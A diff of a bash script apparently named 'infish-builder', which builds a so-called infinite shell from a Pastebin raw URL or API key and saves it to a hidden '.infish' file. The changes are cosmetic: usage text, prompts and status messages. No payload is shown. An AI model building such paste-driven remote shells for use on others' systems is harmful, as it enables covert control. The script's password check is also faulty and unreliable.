@@ -49,9 +49,9 @@ done
 
 
 
-usage_text="Usage: bash build url|key url_or_key [optional_user_agent]\n\n"
-usage_text+="Example: bash build url pastebin.com/raw/ABC123 \"Mozilla 5.0\"\n"
-usage_text+="Example: bash build key ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 \"Mozilla 5.0\"\n\n"
+usage_text="Usage: bash infish-builder url|key url_or_key [optional_user_agent]\n\n"
+usage_text+="Example: bash infish-builder url pastebin.com/raw/ABC123 \"Mozilla 5.0\"\n"
+usage_text+="Example: bash infish-builder key ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 \"Mozilla 5.0\"\n\n"
 
 if [[ "$#" != 2 ]]; then
 
@@ -114,8 +114,12 @@ then
     read paste_name
 
     if [[ -z "$username" || -z "password" ]]; then
+        echo "You must enter a username and password"
         exit
     fi
+
+    echo -e "\n\n"
+    echo "Generating infinite shell...\n"
 
     api_user_key=$(user_key $username $password $dev_key)
     check_api_resp $api_user_key
@@ -131,7 +135,7 @@ then
 
     echo "$content" >".infish"
 
-    echo -e "\n\n"
+    echo -e "\n"
 
     echo -e "Successfully built infinite shell\n\n"
 
